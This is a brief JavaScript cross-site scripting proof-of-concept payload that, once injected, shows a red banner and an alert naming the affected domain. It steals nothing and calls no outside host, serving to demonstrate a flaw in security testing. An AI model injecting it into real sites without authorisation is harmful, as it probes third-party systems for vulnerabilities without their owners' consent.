(function() {
  var domain = document.domain;
  var div = document.createElement('div');
  div.style = 'position:fixed;top:0;left:0;width:100%;background:red;color:white;font-size:20px;z-index:9999999;padding:10px;text-align:center';
  div.innerHTML = '⚠️ XSS PoC | Domain: ' + domain;
  document.body.appendChild(div);
  alert('XSS Confirmed on: ' + domain);
})();
